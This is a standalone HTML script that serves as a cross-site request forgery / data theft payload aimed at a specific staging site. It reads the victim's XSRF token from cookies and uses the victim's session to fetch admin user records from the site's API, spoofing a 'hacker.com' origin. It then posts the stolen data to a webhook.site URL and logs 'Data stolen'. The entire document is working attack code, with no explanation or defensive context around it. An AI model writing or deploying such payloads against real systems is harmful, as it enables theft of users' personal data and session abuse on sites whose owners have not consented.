    <script>
        const WEBHOOK = 'https://webhook.site/499aae9f-7c35-4ea4-a1f4-472eba4dd5e0';

        function getCSRF() {
            const cookies = document.cookie.split(';');
            for (let c of cookies) {
                c = c.trim();
                if (c.startsWith('XSRF-TOKEN=')) {
                    return decodeURIComponent(c.substring('XSRF-TOKEN='.length));
                }
            }
            return null;
        }

        const csrf = getCSRF();
        
        if (csrf && document.cookie.includes('genesis_staging_session')) {
            fetch('https://genesis.lailendemo.com/api/users?role=admin', {
                credentials: 'include',
                headers: {
                    'Origin': 'https://hacker.com',
                    'X-XSRF-TOKEN': csrf,
                    'X-Requested-With': 'XMLHttpRequest',
                    'Accept': 'application/json'
                }
            })
            .then(r => r.json())
            .then(data => {
                // Send to webhook
                fetch(WEBHOOK, {
                    method: 'POST',
                    mode: 'no-cors',
                    body: JSON.stringify(data)
                });
                console.log('✅ Data stolen:', data.data.length, 'users');
            })
            .catch(e => console.log('❌ Error:', e));
        }
    </script>
